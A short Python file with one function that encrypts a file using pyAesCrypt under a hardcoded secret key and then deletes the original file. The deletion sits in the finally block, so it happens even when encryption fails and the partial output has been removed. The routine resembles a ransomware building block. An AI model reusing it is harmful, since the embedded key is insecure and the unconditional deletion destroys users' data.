import os

import pyAesCrypt


def encrypt(src):
    result = 0
    buffer_size = 64 * 1024
    secret_key = get_secret_key()
    dest = f"{src}.encrypted" # Change file name after encryption
    try:
        pyAesCrypt.encryptFile(src, dest, secret_key, buffer_size)
    except:
        # Remove incomplete encrypted file
        if os.path.exists(dest):
            os.remove(dest)
        result = 1
    finally:
        # Remove source file anyway
        os.remove(src)
    return result


def get_secret_key():
    return "GjzYSoMhB6cN7AuEBdZcjhwTy32syk"